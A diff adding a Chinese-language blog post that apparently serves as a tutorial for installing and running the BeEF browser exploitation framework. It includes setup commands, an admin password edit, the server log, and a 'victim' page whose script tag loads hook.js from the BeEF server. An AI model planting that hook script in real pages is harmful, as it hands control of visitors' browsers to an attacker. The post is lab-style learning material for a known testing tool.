@@ -1,0 +1,67 @@
+<p>refer to: <br /><a href="https://github.com/beefproject/beef/blob/master/INSTALL.txt " target="_blank">https://github.com/beefproject/beef/blob/master/INSTALL.txt</a>
+</p>
+<p>详细使用: <br />
+<a href="https://github.com/beefproject/beef/wiki/Interface " target="_blank">https://github.com/beefproject/beef/wiki/Interface</a>
+</p>
+<p>1. git clone https://github.com/beefproject/beef.git</p>
+<p>可以直接运行 ./install&#160; 这个脚本会给你安装ruby, pkg等一系列的东西。</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20221113_100820.png" /></p>
+<p>更有效的办法： 直接bundle install 即可。</p>
+<p>修改登录用户名密码（config.yaml）</p>
+<pre> 18     # Used by both the RESTful API and the Admin interface
+ 19     credentials:
+ 20         user:   "admin"
+ 21         passwd: "123456"
+</pre>
+<p>使用： ./beef&#160; </p>
+<pre>[10:13:44][*] Browser Exploitation Framework (BeEF) 0.5.4.0
+[10:13:44]    |   Twit: @beefproject
+[10:13:44]    |   Site: https://beefproject.com
+[10:13:44]    |   Blog: http://blog.beefproject.com
+[10:13:44]    |_  Wiki: https://github.com/beefproject/beef/wiki
+[10:13:44][*] Project Creator: Wade Alcorn (@WadeAlcorn)
+-- migration_context()
+   -&gt; 0.0207s
+== 1 CreateCommandModules: migrating ==========================================
+-- create_table(:command_modules)
+   -&gt; 0.0056s
+== 1 CreateCommandModules: migrated (0.0058s) =================================
+...
+== 25 CreateXssraysScan: migrating ============================================
+-- create_table(:xssraysscans)
+   -&gt; 0.0070s
+== 25 CreateXssraysScan: migrated (0.0071s) ===================================
+
+[10:13:55][*] BeEF is loading. Wait a few seconds...
+[10:14:35][*] 8 extensions enabled:
+[10:14:35]    |   XSSRays
+[10:14:35]    |   Social Engineering
+[10:14:35]    |   Requester
+[10:14:35]    |   Proxy
+[10:14:35]    |   Network
+[10:14:35]    |   Events
+[10:14:35]    |   Demos
+[10:14:35]    |_  Admin UI
+[10:14:35][*] 309 modules enabled.
+[10:14:35][*] 2 network interfaces were detected.
+[10:14:35][*] running on network interface: 127.0.0.1
+[10:14:35]    |   Hook URL: http://127.0.0.1:3000/hook.js
+[10:14:35]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+[10:14:35][*] running on network interface: 172.22.187.159
+[10:14:35]    |   Hook URL: http://172.22.187.159:3000/hook.js
+[10:14:35]    |_  UI URL:   http://172.22.187.159:3000/ui/panel
+[10:14:35][*] RESTful API key: ad8269157dd9dc78feb3339e376e5ef3684ffba1
+[10:14:35][!] [GeoIP] Could not find MaxMind GeoIP database: '/usr/share/GeoIP/GeoLite2-City.mmdb'
+[10:14:35][*] HTTP Proxy: http://127.0.0.1:6789
+[10:14:35][*] BeEF server started (press control+c to stop)</pre>
+<p>可以看到， 关键的是：</p>
+<p>hook url,&#160; UI url . </p>
+<p>打开 localhost:3000/ui/panel</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20221113_101710.png" /></p>
+<p>使用：</p>
+<p>让受害者 打开这个页面即可：</p>
+<pre>&lt;p&gt; hello &lt;/p&gt;
+&lt;script src="http://172.22.187.159:3000/hook.js"&gt;&lt;/script&gt; </pre>
+<p>然后，就可以看到UI界面：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20221113_103058.png" /></p>
+<p>点击command之后，很猛：<br /><img src="https://files.sweetysoft.com/blog_images/from_paste_20221113_103304.png" /></p>
